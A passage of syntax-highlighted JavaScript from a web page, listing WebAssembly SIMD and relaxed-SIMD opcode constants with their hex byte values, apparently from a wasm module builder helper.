      <span class="token keyword">let</span> kExprS128Load64Splat <span class="token operator">=</span> <span class="token number">0x0a</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128StoreMem <span class="token operator">=</span> <span class="token number">0x0b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Const <span class="token operator">=</span> <span class="token number">0x0c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16Shuffle <span class="token operator">=</span> <span class="token number">0x0d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16Swizzle <span class="token operator">=</span> <span class="token number">0x0e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16Splat <span class="token operator">=</span> <span class="token number">0x0f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8Splat <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4Splat <span class="token operator">=</span> <span class="token number">0x11</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2Splat <span class="token operator">=</span> <span class="token number">0x12</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Splat <span class="token operator">=</span> <span class="token number">0x13</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Splat <span class="token operator">=</span> <span class="token number">0x14</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16ExtractLaneS <span class="token operator">=</span> <span class="token number">0x15</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16ExtractLaneU <span class="token operator">=</span> <span class="token number">0x16</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16ReplaceLane <span class="token operator">=</span> <span class="token number">0x17</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8ExtractLaneS <span class="token operator">=</span> <span class="token number">0x18</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8ExtractLaneU <span class="token operator">=</span> <span class="token number">0x19</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8ReplaceLane <span class="token operator">=</span> <span class="token number">0x1a</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4ExtractLane <span class="token operator">=</span> <span class="token number">0x1b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4ReplaceLane <span class="token operator">=</span> <span class="token number">0x1c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2ExtractLane <span class="token operator">=</span> <span class="token number">0x1d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2ReplaceLane <span class="token operator">=</span> <span class="token number">0x1e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4ExtractLane <span class="token operator">=</span> <span class="token number">0x1f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4ReplaceLane <span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2ExtractLane <span class="token operator">=</span> <span class="token number">0x21</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2ReplaceLane <span class="token operator">=</span> <span class="token number">0x22</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16Eq <span class="token operator">=</span> <span class="token number">0x23</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16Ne <span class="token operator">=</span> <span class="token number">0x24</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16LtS <span class="token operator">=</span> <span class="token number">0x25</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16LtU <span class="token operator">=</span> <span class="token number">0x26</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16GtS <span class="token operator">=</span> <span class="token number">0x27</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16GtU <span class="token operator">=</span> <span class="token number">0x28</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16LeS <span class="token operator">=</span> <span class="token number">0x29</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16LeU <span class="token operator">=</span> <span class="token number">0x2a</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16GeS <span class="token operator">=</span> <span class="token number">0x2b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16GeU <span class="token operator">=</span> <span class="token number">0x2c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8Eq <span class="token operator">=</span> <span class="token number">0x2d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8Ne <span class="token operator">=</span> <span class="token number">0x2e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8LtS <span class="token operator">=</span> <span class="token number">0x2f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8LtU <span class="token operator">=</span> <span class="token number">0x30</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8GtS <span class="token operator">=</span> <span class="token number">0x31</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8GtU <span class="token operator">=</span> <span class="token number">0x32</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8LeS <span class="token operator">=</span> <span class="token number">0x33</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8LeU <span class="token operator">=</span> <span class="token number">0x34</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8GeS <span class="token operator">=</span> <span class="token number">0x35</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8GeU <span class="token operator">=</span> <span class="token number">0x36</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4Eq <span class="token operator">=</span> <span class="token number">0x37</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4Ne <span class="token operator">=</span> <span class="token number">0x38</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4LtS <span class="token operator">=</span> <span class="token number">0x39</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4LtU <span class="token operator">=</span> <span class="token number">0x3a</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4GtS <span class="token operator">=</span> <span class="token number">0x3b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4GtU <span class="token operator">=</span> <span class="token number">0x3c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4LeS <span class="token operator">=</span> <span class="token number">0x3d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4LeU <span class="token operator">=</span> <span class="token number">0x3e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4GeS <span class="token operator">=</span> <span class="token number">0x3f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4GeU <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Eq <span class="token operator">=</span> <span class="token number">0x41</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Ne <span class="token operator">=</span> <span class="token number">0x42</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Lt <span class="token operator">=</span> <span class="token number">0x43</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Gt <span class="token operator">=</span> <span class="token number">0x44</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Le <span class="token operator">=</span> <span class="token number">0x45</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Ge <span class="token operator">=</span> <span class="token number">0x46</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Eq <span class="token operator">=</span> <span class="token number">0x47</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Ne <span class="token operator">=</span> <span class="token number">0x48</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Lt <span class="token operator">=</span> <span class="token number">0x49</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Gt <span class="token operator">=</span> <span class="token number">0x4a</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Le <span class="token operator">=</span> <span class="token number">0x4b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Ge <span class="token operator">=</span> <span class="token number">0x4c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Not <span class="token operator">=</span> <span class="token number">0x4d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128And <span class="token operator">=</span> <span class="token number">0x4e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128AndNot <span class="token operator">=</span> <span class="token number">0x4f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Or <span class="token operator">=</span> <span class="token number">0x50</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Xor <span class="token operator">=</span> <span class="token number">0x51</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Select <span class="token operator">=</span> <span class="token number">0x52</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprV128AnyTrue <span class="token operator">=</span> <span class="token number">0x53</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Load8Lane <span class="token operator">=</span> <span class="token number">0x54</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Load16Lane <span class="token operator">=</span> <span class="token number">0x55</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Load32Lane <span class="token operator">=</span> <span class="token number">0x56</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Load64Lane <span class="token operator">=</span> <span class="token number">0x57</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Store8Lane <span class="token operator">=</span> <span class="token number">0x58</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Store16Lane <span class="token operator">=</span> <span class="token number">0x59</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Store32Lane <span class="token operator">=</span> <span class="token number">0x5a</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Store64Lane <span class="token operator">=</span> <span class="token number">0x5b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Load32Zero <span class="token operator">=</span> <span class="token number">0x5c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Load64Zero <span class="token operator">=</span> <span class="token number">0x5d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4DemoteF64x2Zero <span class="token operator">=</span> <span class="token number">0x5e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2PromoteLowF32x4 <span class="token operator">=</span> <span class="token number">0x5f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16Abs <span class="token operator">=</span> <span class="token number">0x60</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16Neg <span class="token operator">=</span> <span class="token number">0x61</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16Popcnt <span class="token operator">=</span> <span class="token number">0x62</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16AllTrue <span class="token operator">=</span> <span class="token number">0x63</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16BitMask <span class="token operator">=</span> <span class="token number">0x64</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16SConvertI16x8 <span class="token operator">=</span> <span class="token number">0x65</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16UConvertI16x8 <span class="token operator">=</span> <span class="token number">0x66</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Ceil <span class="token operator">=</span> <span class="token number">0x67</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Floor <span class="token operator">=</span> <span class="token number">0x68</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Trunc <span class="token operator">=</span> <span class="token number">0x69</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4NearestInt <span class="token operator">=</span> <span class="token number">0x6a</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16Shl <span class="token operator">=</span> <span class="token number">0x6b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16ShrS <span class="token operator">=</span> <span class="token number">0x6c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16ShrU <span class="token operator">=</span> <span class="token number">0x6d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16Add <span class="token operator">=</span> <span class="token number">0x6e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16AddSatS <span class="token operator">=</span> <span class="token number">0x6f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16AddSatU <span class="token operator">=</span> <span class="token number">0x70</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16Sub <span class="token operator">=</span> <span class="token number">0x71</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16SubSatS <span class="token operator">=</span> <span class="token number">0x72</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16SubSatU <span class="token operator">=</span> <span class="token number">0x73</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Ceil <span class="token operator">=</span> <span class="token number">0x74</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Floor <span class="token operator">=</span> <span class="token number">0x75</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16MinS <span class="token operator">=</span> <span class="token number">0x76</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16MinU <span class="token operator">=</span> <span class="token number">0x77</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16MaxS <span class="token operator">=</span> <span class="token number">0x78</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16MaxU <span class="token operator">=</span> <span class="token number">0x79</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Trunc <span class="token operator">=</span> <span class="token number">0x7a</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16RoundingAverageU <span class="token operator">=</span> <span class="token number">0x7b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8ExtAddPairwiseI8x16S <span class="token operator">=</span> <span class="token number">0x7c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8ExtAddPairwiseI8x16U <span class="token operator">=</span> <span class="token number">0x7d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4ExtAddPairwiseI16x8S <span class="token operator">=</span> <span class="token number">0x7e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4ExtAddPairwiseI16x8U <span class="token operator">=</span> <span class="token number">0x7f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8Abs <span class="token operator">=</span> <span class="token number">0x80</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8Neg <span class="token operator">=</span> <span class="token number">0x81</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8Q15MulRSatS <span class="token operator">=</span> <span class="token number">0x82</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8AllTrue <span class="token operator">=</span> <span class="token number">0x83</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8BitMask <span class="token operator">=</span> <span class="token number">0x84</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8SConvertI32x4 <span class="token operator">=</span> <span class="token number">0x85</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8UConvertI32x4 <span class="token operator">=</span> <span class="token number">0x86</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8SConvertI8x16Low <span class="token operator">=</span> <span class="token number">0x87</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8SConvertI8x16High <span class="token operator">=</span> <span class="token number">0x88</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8UConvertI8x16Low <span class="token operator">=</span> <span class="token number">0x89</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8UConvertI8x16High <span class="token operator">=</span> <span class="token number">0x8a</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8Shl <span class="token operator">=</span> <span class="token number">0x8b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8ShrS <span class="token operator">=</span> <span class="token number">0x8c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8ShrU <span class="token operator">=</span> <span class="token number">0x8d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8Add <span class="token operator">=</span> <span class="token number">0x8e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8AddSatS <span class="token operator">=</span> <span class="token number">0x8f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8AddSatU <span class="token operator">=</span> <span class="token number">0x90</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8Sub <span class="token operator">=</span> <span class="token number">0x91</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8SubSatS <span class="token operator">=</span> <span class="token number">0x92</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8SubSatU <span class="token operator">=</span> <span class="token number">0x93</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2NearestInt <span class="token operator">=</span> <span class="token number">0x94</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8Mul <span class="token operator">=</span> <span class="token number">0x95</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8MinS <span class="token operator">=</span> <span class="token number">0x96</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8MinU <span class="token operator">=</span> <span class="token number">0x97</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8MaxS <span class="token operator">=</span> <span class="token number">0x98</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8MaxU <span class="token operator">=</span> <span class="token number">0x99</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8RoundingAverageU <span class="token operator">=</span> <span class="token number">0x9b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8ExtMulLowI8x16S <span class="token operator">=</span> <span class="token number">0x9c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8ExtMulHighI8x16S <span class="token operator">=</span> <span class="token number">0x9d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8ExtMulLowI8x16U <span class="token operator">=</span> <span class="token number">0x9e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8ExtMulHighI8x16U <span class="token operator">=</span> <span class="token number">0x9f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4Abs <span class="token operator">=</span> <span class="token number">0xa0</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4Neg <span class="token operator">=</span> <span class="token number">0xa1</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4AllTrue <span class="token operator">=</span> <span class="token number">0xa3</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4BitMask <span class="token operator">=</span> <span class="token number">0xa4</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4SConvertI16x8Low <span class="token operator">=</span> <span class="token number">0xa7</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4SConvertI16x8High <span class="token operator">=</span> <span class="token number">0xa8</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4UConvertI16x8Low <span class="token operator">=</span> <span class="token number">0xa9</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4UConvertI16x8High <span class="token operator">=</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4Shl <span class="token operator">=</span> <span class="token number">0xab</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4ShrS <span class="token operator">=</span> <span class="token number">0xac</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4ShrU <span class="token operator">=</span> <span class="token number">0xad</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4Add <span class="token operator">=</span> <span class="token number">0xae</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4Sub <span class="token operator">=</span> <span class="token number">0xb1</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4Mul <span class="token operator">=</span> <span class="token number">0xb5</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4MinS <span class="token operator">=</span> <span class="token number">0xb6</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4MinU <span class="token operator">=</span> <span class="token number">0xb7</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4MaxS <span class="token operator">=</span> <span class="token number">0xb8</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4MaxU <span class="token operator">=</span> <span class="token number">0xb9</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4DotI16x8S <span class="token operator">=</span> <span class="token number">0xba</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4ExtMulLowI16x8S <span class="token operator">=</span> <span class="token number">0xbc</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4ExtMulHighI16x8S <span class="token operator">=</span> <span class="token number">0xbd</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4ExtMulLowI16x8U <span class="token operator">=</span> <span class="token number">0xbe</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4ExtMulHighI16x8U <span class="token operator">=</span> <span class="token number">0xbf</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2Abs <span class="token operator">=</span> <span class="token number">0xc0</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2Neg <span class="token operator">=</span> <span class="token number">0xc1</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2AllTrue <span class="token operator">=</span> <span class="token number">0xc3</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2BitMask <span class="token operator">=</span> <span class="token number">0xc4</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2SConvertI32x4Low <span class="token operator">=</span> <span class="token number">0xc7</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2SConvertI32x4High <span class="token operator">=</span> <span class="token number">0xc8</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2UConvertI32x4Low <span class="token operator">=</span> <span class="token number">0xc9</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2UConvertI32x4High <span class="token operator">=</span> <span class="token number">0xca</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2Shl <span class="token operator">=</span> <span class="token number">0xcb</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2ShrS <span class="token operator">=</span> <span class="token number">0xcc</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2ShrU <span class="token operator">=</span> <span class="token number">0xcd</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2Add <span class="token operator">=</span> <span class="token number">0xce</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2Sub <span class="token operator">=</span> <span class="token number">0xd1</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2Mul <span class="token operator">=</span> <span class="token number">0xd5</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2Eq <span class="token operator">=</span> <span class="token number">0xd6</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2Ne <span class="token operator">=</span> <span class="token number">0xd7</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2LtS <span class="token operator">=</span> <span class="token number">0xd8</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2GtS <span class="token operator">=</span> <span class="token number">0xd9</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2LeS <span class="token operator">=</span> <span class="token number">0xda</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2GeS <span class="token operator">=</span> <span class="token number">0xdb</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2ExtMulLowI32x4S <span class="token operator">=</span> <span class="token number">0xdc</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2ExtMulHighI32x4S <span class="token operator">=</span> <span class="token number">0xdd</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2ExtMulLowI32x4U <span class="token operator">=</span> <span class="token number">0xde</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2ExtMulHighI32x4U <span class="token operator">=</span> <span class="token number">0xdf</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Abs <span class="token operator">=</span> <span class="token number">0xe0</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Neg <span class="token operator">=</span> <span class="token number">0xe1</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Sqrt <span class="token operator">=</span> <span class="token number">0xe3</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Add <span class="token operator">=</span> <span class="token number">0xe4</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Sub <span class="token operator">=</span> <span class="token number">0xe5</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Mul <span class="token operator">=</span> <span class="token number">0xe6</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Div <span class="token operator">=</span> <span class="token number">0xe7</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Min <span class="token operator">=</span> <span class="token number">0xe8</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Max <span class="token operator">=</span> <span class="token number">0xe9</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Pmin <span class="token operator">=</span> <span class="token number">0xea</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Pmax <span class="token operator">=</span> <span class="token number">0xeb</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Abs <span class="token operator">=</span> <span class="token number">0xec</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Neg <span class="token operator">=</span> <span class="token number">0xed</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Sqrt <span class="token operator">=</span> <span class="token number">0xef</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Add <span class="token operator">=</span> <span class="token number">0xf0</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Sub <span class="token operator">=</span> <span class="token number">0xf1</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Mul <span class="token operator">=</span> <span class="token number">0xf2</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Div <span class="token operator">=</span> <span class="token number">0xf3</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Min <span class="token operator">=</span> <span class="token number">0xf4</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Max <span class="token operator">=</span> <span class="token number">0xf5</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Pmin <span class="token operator">=</span> <span class="token number">0xf6</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Pmax <span class="token operator">=</span> <span class="token number">0xf7</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4SConvertF32x4 <span class="token operator">=</span> <span class="token number">0xf8</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4UConvertF32x4 <span class="token operator">=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4SConvertI32x4 <span class="token operator">=</span> <span class="token number">0xfa</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4UConvertI32x4 <span class="token operator">=</span> <span class="token number">0xfb</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4TruncSatF64x2SZero <span class="token operator">=</span> <span class="token number">0xfc</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4TruncSatF64x2UZero <span class="token operator">=</span> <span class="token number">0xfd</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2ConvertLowI32x4S <span class="token operator">=</span> <span class="token number">0xfe</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2ConvertLowI32x4U <span class="token operator">=</span> <span class="token number">0xff</span><span class="token punctuation">;</span>
      <span class="token comment">// Relaxed SIMD.</span>
      <span class="token keyword">let</span> kExprI8x16RelaxedSwizzle <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
